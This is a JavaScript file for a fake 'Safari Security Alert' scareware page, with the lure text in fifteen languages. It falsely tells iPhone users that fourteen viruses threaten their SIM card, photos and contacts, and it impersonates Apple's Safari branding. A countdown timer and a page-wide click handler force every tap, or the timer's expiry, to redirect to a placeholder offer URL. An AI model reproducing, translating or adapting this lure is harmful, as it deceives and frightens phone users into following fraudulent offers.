const OFFER_URL = "{offer}";
const COUNTDOWN_SECONDS = 168;

const translations = {
  en: {
    title: "Safari Security Alert",
    brand: "Safari",
    heroTitle: "14 VIRUSES FOUND!",
    heroDanger: "DELETE ALL",
    heroCopy: "Your iPhone may be harboring viruses that pose a serious threat to your SIM card, personal data, photos, and contacts. If left unaddressed, these issues could escalate quickly, leading to potential damage. It's crucial to take action right away to safeguard your device and its contents.",
    heroWarning: "This is very dangerous for you and your phone; remove the viruses immediately!",
    timerCopy: "Immediate action is required!",
    cta: "Remove Viruses Now"
  },
  fr: {
  title: "Alerte de sécurité Safari",
  brand: "Safari",
  heroTitle: "14 VIRUS DÉTECTÉS !",
  heroDanger: "SUPPRIMEZ-LES TOUS",
  heroCopy: "Votre iPhone pourrait contenir des virus qui représentent une menace sérieuse pour votre carte SIM, vos données personnelles, vos photos et vos contacts. Si le problème n'est pas traité, il peut s'aggraver rapidement et causer des dommages. Il est essentiel d'agir tout de suite pour protéger votre appareil et son contenu.",
  heroWarning: "C'est très dangereux pour vous et votre téléphone ; supprimez les virus immédiatement !",
  timerCopy: "Une action immédiate est requise !",
  cta: "Supprimer les virus maintenant"
},

"pt-PT": {
  title: "Alerta de Segurança do Safari",
  brand: "Safari",
  heroTitle: "14 VÍRUS ENCONTRADOS!",
  heroDanger: "ELIMINE TODOS",
  heroCopy: "O seu iPhone pode conter vírus que representam uma ameaça grave para o seu cartão SIM, dados pessoais, fotografias e contactos. Se não forem resolvidos, estes problemas podem agravar-se rapidamente e causar danos. É crucial agir imediatamente para proteger o seu dispositivo e o respetivo conteúdo.",
  heroWarning: "Isto é muito perigoso para si e para o seu telefone; remova os vírus imediatamente!",
  timerCopy: "É necessária uma ação imediata!",
  cta: "Remover vírus agora"
},

"pt-BR": {
  title: "Alerta de Segurança do Safari",
  brand: "Safari",
  heroTitle: "14 VÍRUS ENCONTRADOS!",
  heroDanger: "REMOVA TODOS",
  heroCopy: "Seu iPhone pode estar com vírus que representam uma séria ameaça ao seu cartão SIM, dados pessoais, fotos e contatos. Se não forem resolvidos, esses problemas podem se agravar rapidamente e causar possíveis danos. É crucial agir imediatamente para proteger seu dispositivo e seu conteúdo.",
  heroWarning: "Isso é muito perigoso para você e para o seu telefone; remova os vírus imediatamente!",
  timerCopy: "É necessária uma ação imediata!",
  cta: "Remover vírus agora"
},

es: {
  title: "Alerta de seguridad de Safari",
  brand: "Safari",
  heroTitle: "¡SE HAN ENCONTRADO 14 VIRUS!",
  heroDanger: "ELIMÍNELOS TODOS",
  heroCopy: "Su iPhone podría contener virus que representan una amenaza grave para su tarjeta SIM, datos personales, fotos y contactos. Si no se solucionan, estos problemas pueden agravarse rápidamente y provocar posibles daños. Es fundamental actuar de inmediato para proteger su dispositivo y su contenido.",
  heroWarning: "Esto es muy peligroso para usted y para su teléfono; elimine los virus inmediatamente.",
  timerCopy: "¡Se requiere una acción inmediata!",
  cta: "Eliminar virus ahora"
},

"es-419": {
  title: "Alerta de seguridad de Safari",
  brand: "Safari",
  heroTitle: "¡SE ENCONTRARON 14 VIRUS!",
  heroDanger: "ELIMÍNALOS TODOS",
  heroCopy: "Tu iPhone podría tener virus que representan una amenaza grave para tu tarjeta SIM, datos personales, fotos y contactos. Si no se resuelven, estos problemas pueden agravarse rápidamente y causar posibles daños. Es crucial actuar de inmediato para proteger tu dispositivo y su contenido.",
  heroWarning: "Esto es muy peligroso para ti y para tu teléfono; elimina los virus inmediatamente.",
  timerCopy: "¡Se requiere una acción inmediata!",
  cta: "Eliminar virus ahora"
},

da: {
  title: "Safari-sikkerhedsadvarsel",
  brand: "Safari",
  heroTitle: "14 VIRUSSER FUNDET!",
  heroDanger: "FJERN DEM ALLE",
  heroCopy: "Din iPhone kan indeholde virus, der udgør en alvorlig trussel mod dit SIM-kort, dine personlige data, billeder og kontakter. Hvis problemet ikke løses, kan det hurtigt eskalere og føre til mulig skade. Det er afgørende at handle med det samme for at beskytte din enhed og dens indhold.",
  heroWarning: "Dette er meget farligt for dig og din telefon; fjern virusserne med det samme!",
  timerCopy: "Øjeblikkelig handling er påkrævet!",
  cta: "Fjern virus nu"
},

ja: {
  title: "Safariセキュリティ警告",
  brand: "Safari",
  heroTitle: "14個のウイルスを検出！",
  heroDanger: "すべて削除",
  heroCopy: "お使いのiPhoneには、SIMカード、個人データ、写真、連絡先に深刻な脅威を与えるウイルスが潜んでいる可能性があります。対処しないままにすると、問題が急速に悪化し、損害につながる恐れがあります。デバイスとその内容を保護するため、今すぐ対応することが重要です。",
  heroWarning: "これはあなたとあなたの電話にとって非常に危険です。すぐにウイルスを削除してください！",
  timerCopy: "直ちに対応が必要です！",
  cta: "今すぐウイルスを削除"
},

fil: {
  title: "Babala sa Seguridad ng Safari",
  brand: "Safari",
  heroTitle: "14 VIRUS ANG NATAGPUAN!",
  heroDanger: "ALISIN ANG LAHAT",
  heroCopy: "Maaaring may mga virus ang iyong iPhone na seryosong banta sa iyong SIM card, personal na data, mga larawan, at mga contact. Kapag hindi agad naayos, maaaring mabilis na lumala ang mga problemang ito at magdulot ng posibleng pinsala. Mahalagang kumilos agad upang maprotektahan ang iyong device at ang nilalaman nito.",
  heroWarning: "Napakadelikado nito para sa iyo at sa iyong telepono; alisin agad ang mga virus!",
  timerCopy: "Kailangang kumilos agad!",
  cta: "Alisin ang mga Virus Ngayon"
},

de: {
  title: "Safari-Sicherheitswarnung",
  brand: "Safari",
  heroTitle: "14 VIREN GEFUNDEN!",
  heroDanger: "ALLE ENTFERNEN",
  heroCopy: "Auf Ihrem iPhone befinden sich möglicherweise Viren, die eine ernste Bedrohung für Ihre SIM-Karte, persönlichen Daten, Fotos und Kontakte darstellen. Wenn sie nicht behoben werden, können diese Probleme schnell eskalieren und mögliche Schäden verursachen. Es ist entscheidend, sofort zu handeln, um Ihr Gerät und seine Inhalte zu schützen.",
  heroWarning: "Das ist sehr gefährlich für Sie und Ihr Telefon; entfernen Sie die Viren sofort!",
  timerCopy: "Sofortiges Handeln ist erforderlich!",
  cta: "Viren jetzt entfernen"
},

nb: {
  title: "Safari-sikkerhetsvarsel",
  brand: "Safari",
  heroTitle: "14 VIRUS FUNNET!",
  heroDanger: "FJERN ALLE",
  heroCopy: "Din iPhone kan inneholde virus som utgjør en alvorlig trussel mot SIM-kortet, personopplysningene, bildene og kontaktene dine. Hvis problemet ikke løses, kan det raskt eskalere og føre til mulig skade. Det er avgjørende å handle med en gang for å beskytte enheten og innholdet.",
  heroWarning: "Dette er svært farlig for deg og telefonen din; fjern virusene umiddelbart!",
  timerCopy: "Umiddelbar handling er nødvendig!",
  cta: "Fjern virus nå"
},

sv: {
  title: "Safari-säkerhetsvarning",
  brand: "Safari",
  heroTitle: "14 VIRUS HITTADE!",
  heroDanger: "TA BORT ALLA",
  heroCopy: "Din iPhone kan innehålla virus som utgör ett allvarligt hot mot ditt SIM-kort, dina personuppgifter, foton och kontakter. Om problemet inte åtgärdas kan det snabbt förvärras och leda till möjlig skada. Det är viktigt att agera direkt för att skydda din enhet och dess innehåll.",
  heroWarning: "Detta är mycket farligt för dig och din telefon; ta bort virusen omedelbart!",
  timerCopy: "Omedelbar åtgärd krävs!",
  cta: "Ta bort virus nu"
},

it: {
  title: "Avviso di sicurezza Safari",
  brand: "Safari",
  heroTitle: "14 VIRUS TROVATI!",
  heroDanger: "ELIMINALI TUTTI",
  heroCopy: "Il tuo iPhone potrebbe contenere virus che rappresentano una grave minaccia per la tua scheda SIM, i dati personali, le foto e i contatti. Se non vengono risolti, questi problemi potrebbero peggiorare rapidamente e causare possibili danni. È fondamentale agire subito per proteggere il dispositivo e il suo contenuto.",
  heroWarning: "Questo è molto pericoloso per te e per il tuo telefono; rimuovi immediatamente i virus!",
  timerCopy: "È richiesta un'azione immediata!",
  cta: "Rimuovi virus ora"
},

nl: {
  title: "Safari-beveiligingswaarschuwing",
  brand: "Safari",
  heroTitle: "14 VIRUSSEN GEVONDEN!",
  heroDanger: "VERWIJDER ZE ALLEMAAL",
  heroCopy: "Uw iPhone kan virussen bevatten die een ernstige bedreiging vormen voor uw simkaart, persoonlijke gegevens, foto's en contacten. Als deze problemen niet worden opgelost, kunnen ze snel escaleren en mogelijke schade veroorzaken. Het is cruciaal om meteen actie te ondernemen om uw apparaat en de inhoud ervan te beschermen.",
  heroWarning: "Dit is zeer gevaarlijk voor u en uw telefoon; verwijder de virussen onmiddellijk!",
  timerCopy: "Onmiddellijke actie is vereist!",
  cta: "Virussen nu verwijderen"
},

ro: {
  title: "Alertă de securitate Safari",
  brand: "Safari",
  heroTitle: "14 VIRUȘI GĂSIȚI!",
  heroDanger: "ȘTERGEȚI-I PE TOȚI",
  heroCopy: "iPhone-ul dvs. poate conține viruși care reprezintă o amenințare gravă pentru cartela SIM, datele personale, fotografiile și contactele dvs. Dacă nu sunt rezolvate, aceste probleme se pot agrava rapid și pot provoca daune. Este esențial să acționați imediat pentru a vă proteja dispozitivul și conținutul acestuia.",
  heroWarning: "Acest lucru este foarte periculos pentru dvs. și pentru telefon; eliminați virușii imediat!",
  timerCopy: "Este necesară o acțiune imediată!",
  cta: "Eliminați virușii acum"
}
};

const compactTextSizes = {
  default: {
    "--cta-min-height":"55px",
    "--alert__icon-with":"55px",
    "--topbar-min-height": "70px",
    "--topbar-padding": "15px 20px 15px",
    "--brand-font-size": "22px",
    "--date-font-size": "16px",
    "--title-font-size": "26px",
    "--copy-font-size": "14px",
    "--timer-font-size": "24px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "10px",
    "--cta-font-size": "17px"
  },
  min414: {
    "--brand-icon-width": "44px",
    "--brand-icon-height": "44px",
    "--brand-font-size": "23px",
    "--date-font-size": "19px",
    "--title-font-size": "34px",
    "--copy-font-size": "16px",
    "--timer-font-size": "30px",
    "--timer-copy-font-size": "14px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "21px"
  },
  max390: {
    "--alert__icon-with":"60px",
    "--brand-font-size": "24px",
    "--date-font-size": "17px",
    "--title-font-size": "34px",
    "--copy-font-size": "15px",
    "--timer-font-size": "26px",
    "--timer-copy-font-size": "14px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "16px"
  },
  max375: {
    "--brand-font-size": "18px",
    "--date-font-size": "16px",
    "--title-font-size": "24px",
    "--copy-font-size": "13px",
    "--timer-font-size": "20px",
    "--timer-copy-font-size": "11px",
    "--steps-title-font-size": "13px",
    "--steps-font-size": "10px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "14px",
    "--cta-min-height":"55px"
  },
  max320: {
    "--brand-font-size": "20px",
    "--date-font-size": "13px",
    "--title-font-size": "24px",
    "--copy-font-size": "14px",
    "--timer-font-size": "27px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "16px"
  }
};

const baseTextSizes = {
  default: {
    "--brand-font-size": "23px",
    "--date-font-size": "18px",
    "--title-font-size": "30px",
    "--copy-font-size": "14px",
    "--timer-font-size": "30px",
    "--timer-copy-font-size": "16px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "22px"
  },
  min414: {
    "--brand-font-size": "27px",
    "--date-font-size": "20px",
    "--title-font-size": "38px",
    "--copy-font-size": "18px",
    "--timer-font-size": "40px",
    "--timer-copy-font-size": "16px",
    "--steps-title-font-size": "18px",
    "--steps-font-size": "14px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "25px"
  },
  max390: {
    "--brand-font-size": "24px",
    "--date-font-size": "18px",
    "--title-font-size": "38px",
    "--copy-font-size": "15px",
    "--timer-font-size": "34px",
    "--timer-copy-font-size": "15px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "12px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "23px"
  },
  max375: {
    "--brand-font-size": "20px",
    "--date-font-size": "16px",
    "--title-font-size": "24px",
    "--copy-font-size": "13px",
    "--timer-font-size": "20px",
    "--timer-copy-font-size": "13px",
    "--steps-title-font-size": "13px",
    "--steps-font-size": "10px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "18px"
  },
  max320: {
    "--brand-font-size": "21px",
    "--date-font-size": "14px",
    "--title-font-size": "30px",
    "--copy-font-size": "16px",
    "--timer-font-size": "32px",
    "--timer-copy-font-size": "15px",
    "--steps-title-font-size": "16px",
    "--steps-font-size": "15px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "18px"
  }
};

const localeTextSizes = {
  default: baseTextSizes,
  en: baseTextSizes,
  fr: compactTextSizes,
  "pt-PT": compactTextSizes,
  "pt-BR": compactTextSizes,
  es: compactTextSizes,
  "es-419": compactTextSizes,
  da: compactTextSizes,
  fil: compactTextSizes,
  de: compactTextSizes,
  nb: compactTextSizes,
  sv: compactTextSizes,
  it: compactTextSizes,
  nl: compactTextSizes,
  ro: compactTextSizes
};

function getRequestedLocale(supportedLocales) {
  const params = new URLSearchParams(window.location.search);
  const requestedLocale = params.get("lang") || params.get("locale");
  if (!requestedLocale) return null;

  const normalizedRequestedLocale = requestedLocale.toLowerCase();
  const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedRequestedLocale);
  if (exactLocale) return exactLocale;

  const baseLocale = normalizedRequestedLocale.split("-")[0];
  return supportedLocales.find((key) => key.toLowerCase() === baseLocale) || null;
}

function resolveLocale() {
  const supportedLocales = Object.keys(translations);
  const requestedLocale = getRequestedLocale(supportedLocales);
  if (requestedLocale) return requestedLocale;

  const browserLocales = Array.isArray(navigator.languages) && navigator.languages.length
    ? navigator.languages
    : [navigator.language || document.documentElement.lang || "en"];

  for (const candidate of browserLocales) {
    const normalizedCandidate = candidate.toLowerCase();
    const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedCandidate);
    if (exactLocale) return exactLocale;

    const baseLocale = normalizedCandidate.split("-")[0];
    const baseMatch = supportedLocales.find((key) => key.toLowerCase() === baseLocale);
    if (baseMatch) return baseMatch;
  }

  return "en";
}

const locale = resolveLocale();
const dictionary = translations[locale] || translations.en;
let remainingSeconds = COUNTDOWN_SECONDS;
let redirected = false;

function setViewportHeight() {
  const viewportHeight = window.visualViewport
    ? window.visualViewport.height
    : window.innerHeight;

  document.documentElement.style.setProperty(
    "--app-viewport-height",
    `${Math.round(viewportHeight)}px`
  );
}

function getTextSizeBreakpoint() {
  if (window.matchMedia("(max-width: 320px)").matches) return "max320";
  if (window.matchMedia("(max-width: 375px)").matches) return "max375";
  if (window.matchMedia("(max-width: 390px)").matches) return "max390";
  if (window.matchMedia("(min-width: 414px)").matches) return "min414";

  return "default";
}

function applyLocaleTextSizes() {
  const landing = document.querySelector(".landing");
  const sizeConfig = localeTextSizes[locale] || localeTextSizes.default;
  if (!landing || !sizeConfig) return;

  landing.dataset.locale = locale;

  const breakpoint = getTextSizeBreakpoint();
  const values = sizeConfig[breakpoint] || sizeConfig.default;

  Object.entries(values).forEach(([property, value]) => {
    landing.style.setProperty(property, value);
  });
}

function applyTranslations() {
  document.title = dictionary.title;

  document.querySelectorAll("[data-i18n]").forEach((node) => {
    const key = node.dataset.i18n;
    node.textContent = dictionary[key] || translations.en[key] || key;
  });
}

function setCurrentDate() {
  const dateNode = document.querySelector("[data-current-date]");
  if (!dateNode) return;

  const now = new Date();
  dateNode.dateTime = now.toISOString();
  dateNode.textContent = new Intl.DateTimeFormat(locale, {
    month: "long",
    day: "numeric"
  }).format(now);
}

function renderCountdown() {
  const timerNode = document.querySelector("[data-countdown]");
  if (!timerNode) return;

  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
  const seconds = String(remainingSeconds % 60).padStart(2, "0");
  timerNode.textContent = `00:${minutes}:${seconds}`;
}

function goToOffer() {
  if (redirected) return;
  redirected = true;
  window.location.href = OFFER_URL;
}

function startCountdown() {
  renderCountdown();

  const intervalId = window.setInterval(() => {
    remainingSeconds -= 1;
    renderCountdown();

    if (remainingSeconds <= 0) {
      window.clearInterval(intervalId);
      goToOffer();
    }
  }, 1000);
}

function bindClicks() {
  const offerLink = document.querySelector("[data-offer-link]");
  if (offerLink) {
    offerLink.href = OFFER_URL;
    offerLink.addEventListener("click", (event) => {
      event.preventDefault();
      goToOffer();
    });
  }

  document.addEventListener("click", (event) => {
    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
    if (isModifiedClick) return;

    event.preventDefault();
    goToOffer();
  });
}

applyLocaleTextSizes();
applyTranslations();
setViewportHeight();
setCurrentDate();
startCountdown();
bindClicks();

window.addEventListener("resize", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});
window.addEventListener("orientationchange", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", setViewportHeight);
  window.visualViewport.addEventListener("scroll", setViewportHeight);
}
